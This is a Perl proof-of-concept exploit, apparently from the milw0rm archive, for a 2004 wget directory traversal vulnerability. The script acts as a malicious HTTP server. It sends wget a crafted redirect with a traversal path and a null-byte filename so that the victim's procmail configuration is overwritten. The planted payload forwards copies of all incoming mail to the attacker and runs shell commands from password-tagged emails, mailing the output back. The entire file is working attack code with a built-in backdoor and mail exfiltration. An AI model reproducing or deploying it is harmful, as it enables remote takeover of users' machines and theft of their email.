#!/usr/bin/perl -W
# wgettrap.poc -- A POC for the wget(1) directory traversal vulnerability
#
# Copyright 2004 Jan Min=C3=A1=C5=99 (jjminar fastmail fm)
# License: Public Domain - SECU
#
# When wget connects to us, we send it a HTTP redirect constructed so that wget
# wget will connect the second time, it will be attempting to override
# ~/.procm4ilrc (well, provided that the user running wget has username 'jan'
# 8-)).

use POSIX qw(strftime);

# This is our scheme/host/port
$server =3D "http://localhost:31340";
# Use this + DNS poisoning with wget 1.9 & CVS
#$server =3D "http://..";

# Wanna know who got infected?=20
#$log =3D "/dev/pts/1";

# The filename we will try to overwrite on the target system
$filename =3D "/home/jan/.procm4ilrc%00This%20part%20will%20be%20ignored.";

############### Payload #########################################
$email =3D 'your@mailbox';
$password =3D 'Pmrpuf ner cevzvgvirf';
$payload =3D <<EOP;
:0c
| mail -s 'Wgettrap mail copy' $email
:0
* ^X-Wgettrap-Command: shell
* ^X-Wgettrap-Password: $password
| /bin/sh -c '/bin/sh | mail -s "Wgettrap shell output" $email'
EOP
chomp $payload;
############### Payload #########################################

# A simple directory traversal, for greater effect
$trick =3D "/.." . "%2f.." x 40;

open LOG, ">$log" if $log;

while(<STDIN>){
print LOG $_ if $log;
if (/\Q$trick$filename\E/) {
#if (/%2f/) {
# We see the filename, so this is the second time
# they're here. Time to feed the sploit.
$second++;
} elsif (/^Range: bytes=3D\(33\)-/) {
# Appending goes like this:
# (1) Tell'em what you're gonna tell'em
# (2) Then tell'em just a half
# (3) Close it
# (4) Wait
# (5) They're comin' back, with wget -c
# (6) Tell'em the sploit
# (7) Close again
# (8) Wtf? They're comin' back with wget -c again
# (9) Tell'em the rest...
# (10) ... enjoying the backdoor at the same time
print LOG "File if $1 bytes long\n" if $log;
} elsif (/^\r?$/) {
# The HTTP headers are over. Let's do it!
$date =3D strftime ("%a, %e %b %Y %H:%M:%S %z", localtime);
if (!$second) {
# Print the payload
print <<EOT;
HTTP/1.1 301 Moved Permanently\r
Date: $date\r
Server: wgettrap 1.1\r
Accept-Ranges: bytes\r
Location: $server$trick$filename\r
Content-Length: 43\r
Connection: close\r
Content-Type: text/html\r
\r
<html><head><title></title></head></html>\r
EOT
} else {
# Print the redirection
print <<EOT;
HTTP/1.1 200 OK\r
Date: $date\r
Server: wgettrap 1.1\r
Accept-Ranges: bytes\r
Content-Length: 25\r
Connection: close\r
Content-Type: text/plain\r
\r
$payload
EOT
}
exit 0;
}
}

# milw0rm.com [2004-12-15]